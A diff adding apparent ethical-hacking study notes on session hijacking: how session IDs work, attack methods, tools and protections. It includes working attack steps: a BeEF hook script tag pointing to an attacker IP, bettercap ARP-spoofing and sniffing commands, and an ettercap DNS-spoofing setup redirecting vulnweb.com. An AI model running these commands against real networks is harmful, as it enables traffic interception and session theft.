@@ -1,0 +1,77 @@
+---------------------------------------------------------------------Session Hijacking---------------------------------------------------------------------
+
+# Session Hijacking - Session Hijacking is the process of taking control of an active session over active User.
+============================================================================================================================================================
+# What is a Sessions ID
+	-> After Validating user with on basis of username and password, server assign him a string value called **Session ID**
+	-> These Session ID's are used to identify USERs.
+	-> After Validating user's credentials a fresh Session ID is assigned to User Every time.
+	-> This Session ID is Stored in Form of Cookies on User's Browser.
+============================================================================================================================================================
+# Why Session Hijacking Works
+	-> Insecure Session Handling
+	-> Insecure Session Termination
+	-> Weak Session ID generation algorithms - linear algo. used such as time or IP address for generating session ID.
+	-> Unencrypted Session ID's
+============================================================================================================================================================
+#Session Hijacking in OSI model
+
+#network-level Hijacking
+Network-level hijacking can be defined as the interception of packets during the transmission between a client and the server in a TCP or UDP session
+
+#application-level Hijacking
+Application-level hijacking refers to gaining control over the HTTP's user session by obtaining the session IDs	
+============================================================================================================================================================
+# Methods to obtain Session ID
+	-> Predict Session
+	-> MITM = Man In The Middle Attack
+	-> MITB = Man In The Browser Attack => Hijack Victims Browser -
+	-> Network Sniffing
+	-> Malware Attack
+	-> XSS = Cross-Site Scripting => Executing Malicious Script to fetch User Cookies, when Victim Browse a Website script executes and Attacker get Session ID.
+	-> Proxy Server => Attacker user their System as a Proxy Server for Victim so that all the traffic pass through their machine, and they can extract juicy info                                  from requests and responses.
+
+# BeEF
+make php file = <script src="http://your-ip:3000/hook.js"></script>
+php -S your-ip:8989 -F index.php
+
+#bettercap
+sudo bettercap
+net.probe on
+net.show
+set arp.spoof.targets target-ip
+arp.spoof on
+net.sniff on
+============================================================================================================================================================
+# Session Hijacking Tools
+	-> Burp Suite
+	-> OWASP ZAP
+	-> Bettercap
+	-> SSL Strip
+	-> DroidSheep
+	-> Droidsniff
+	-> Faceniff
+============================================================================================================================================================
+# Protection Against Session Hijacking
+	-> Use SSH to create secure communication Channel
+	-> Pass Authentication cookie over HTTPS Connection
+	-> Generate Session ID After Verifying credentials
+	-> Use Encryption Over Data and cookies
+	-> Use Lengthy Session-ID's
+	-> Set Low Timeout for session expiration
+	-> Use Strong Authentication like Kerberos
+	-> Check Website Certificates
+	-> Use Secure Protocol
+
+
+#DNS poisoing
+route -n = gateway
+apt install gedit
+gedit /var/www/html/index.html
+systemctl start apache2
+gedit /etc/ettercap/etter.conf = ec_uid=0 ec_gid=0 = linux=uncomment
+gedit /etc/ettercap/etter.dns 
+vulnweb.com A 192.168.1.5
+*.vulnweb.com A 192.168.1.5
+www.vulnweb.com PTR 192.168.1.5
+ettercap -T -q -i wlan0 -M arp:remote /192.168.1.6// /192.168.1.19 router_ip// -P dns_spoof
